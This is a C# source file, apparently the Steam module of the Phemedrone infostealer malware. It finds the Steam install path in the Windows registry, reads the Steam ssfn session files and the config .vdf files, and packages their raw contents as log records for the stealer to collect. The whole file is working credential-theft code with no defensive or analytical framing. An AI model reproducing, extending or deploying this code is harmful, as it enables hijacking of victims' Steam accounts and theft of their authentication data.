using Phemedrone.Classes;
using Phemedrone.Services;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;
using System;
using System.Linq;
using Phemedrone.Extensions;

namespace Phemedrone.Services
{
    public class Steam : IService
    {
        public override PriorityLevel Priority => PriorityLevel.Medium;

        protected override LogRecord[] Collect()
        {
            var array = new List<LogRecord>();
            
            var steamPath = NullableValue.Call(() =>
                Registry.GetValue(@"HKEY_CURRENT_USER\Software\Valve\Steam", "SteamPath", null));
            if (steamPath == null) return array.ToArray();
            
            if (!Directory.Exists((string)steamPath)) return array.ToArray();

            foreach (var files in new List<string[]>
                     {
                         Directory.GetFiles((string)steamPath, "*ssfn*"),
                         Directory.GetFiles((string)steamPath + "\\config", "*.vdf")
                     })
            {
                foreach (var file in files)
                {
                    var content = NullableValue.Call(() => File.ReadAllBytes(file));
                    if (content == null) continue;
                    
                    array.Add(new LogRecord
                    {
                        Path = "Steam/" + file.Replace((string)steamPath + "\\", null),
                        Content = content
                    });
                }
            }
            return array.ToArray();
        }
    }
}